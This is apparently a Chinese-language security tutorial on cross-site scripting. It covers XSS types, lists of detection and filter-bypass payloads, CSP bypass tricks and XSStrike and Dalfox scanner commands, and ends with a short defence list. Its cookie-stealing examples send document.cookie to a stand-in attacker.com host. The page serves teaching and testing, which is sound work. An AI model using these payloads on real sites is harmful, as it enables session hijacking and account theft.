---
title: XSS
description: 跨站脚本攻击原理、类型与利用方法。
date: 2026-06-21T01:00:00.000Z
---


## XSS（跨站脚本攻击）

XSS（Cross-Site Scripting）是一种将恶意脚本注入到网页中的攻击方式，攻击者可以通过 XSS 窃取用户 Cookie、发起钓鱼攻击等。

### 什么是 XSS？

XSS 攻击的本质是"代码注入"——攻击者将恶意的 JavaScript 代码注入到网页中，当其他用户访问该页面时，恶意代码会在其浏览器中执行。

XSS 的名称"Cross-Site Scripting"容易引起误解，因为它实际上与"跨站"关系不大，更多是"跨站点的脚本注入"。

### 危害

- **窃取 Cookie**：获取用户登录凭证
- **会话劫持**：冒充用户执行操作
- **钓鱼攻击**：伪造登录页面
- **蠕虫传播**：自动感染其他用户
- **键盘记录**：记录用户输入

### 真实案例

2005 年，Samy蠕虫通过 XSS 在 MySpace 上疯狂传播，在短短 20 小时内感染了超过 100 万用户，成为历史上第一个 XSS 蠕虫。

---

### 一、XSS 原理

当应用程序将用户输入的内容直接输出到页面中，且未进行适当的转义或过滤时，攻击者可以注入恶意的 HTML/JavaScript 代码。

---

### 二、XSS 类型

#### 1. 反射型 XSS（Reflected XSS）

恶意代码通过 URL 参数注入，服务器立即把参数内容反射回页面。

**攻击示例：**

```
http://target.com/search?q=<script>alert(document.cookie)</script>
```

**特点：**
- 需要诱导用户点击恶意链接
- 一次性攻击
- 不存储在服务器

#### 2. 存储型 XSS（Stored XSS）

恶意代码被存储到服务器数据库，当其他用户访问页面时自动执行。

**攻击场景：**
- 论坛发帖
- 评论区留言
- 用户资料

**危害：**
- 大规模用户感染
- 持久性攻击
- 传播蠕虫

#### 3. DOM 型 XSS

在客户端 JavaScript 中直接操作 DOM 时产生，不经过服务器。

```javascript
// 危险代码
document.getElementById("output").innerHTML = location.hash.slice(1);

// 攻击 URL
http://target.com/page#<img src=x onerror=alert(1)>
```

---

### 三、常用 Payload

#### 基础检测

```html
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<script>alert('XSS')</script>
```

#### 事件触发

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<input onblur=alert(1) autofocus><input autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
```

#### 绕过过滤

```html
<!-- 大小写 -->
<ScRiPt>alert(1)</sCrIpT>

<!-- 双写 -->
<scriptscript>alert(1)</scriptscript>

<!-- 编码 -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- 不使用 script 标签 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

<!-- SVG -->
<svg><script>alert(1)</script></svg>

<!-- 事件属性 -->
<details open ontoggle=alert(1)>
```

#### 窃取 Cookie

```html
<script>
new Image().src="http://attacker.com/steal?c="+document.cookie;
</script>

<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

---

### 四、CSP 绕过

Content Security Policy 是一种安全机制，限制页面可以加载的资源。

**常见绕过：**

```html
<!-- 利用 JSONP 接口 -->
<script src="http://target.com/jsonp?callback=alert(1)//"></script>

<!-- 利用 CDN -->
<script src="https://cdn.jsdelivr.net/npm/angular@1.4.6/angular.min.js"></script>
<div ng-app>{{$on.constructor('alert(1)')()}}</div>

<!-- base-uri 未设置 -->
<base href="http://attacker.com/">
```

---

### 五、自动化工具

#### XSStrike

```bash
# 基本扫描
xsstrike -u "http://target.com/search?q=test"

# 爆破参数
xsstrike -u "http://target.com/page" --data="q=test" -m POST

# 使用 Cookie
xsstrike -u "http://target.com/page" --cookie="session=abc123"
```

#### Dalfox

```bash
# 参数扫描
dalfox url "http://target.com/search?q=test"

# POST 请求
dalfox url "http://target.com/search" --method POST --data "q=test"
```

---

### 六、防御方法

1. **输入过滤**：过滤特殊字符
2. **输出转义**：HTML 实体编码 `< > " ' &`
3. **CSP**：限制脚本来源
4. **HttpOnly Cookie**：防止 JS 访问 Cookie
5. **DOM Purity**：使用安全的 DOM API

---

### 七、练习平台

- [XSS Game](https://xss-game.appspot.com/)
- [DVWA](https://github.com/digininja/DVWA)
- [Pikachu](https://github.com/zhuifengshaonianhanlu/pikachu)
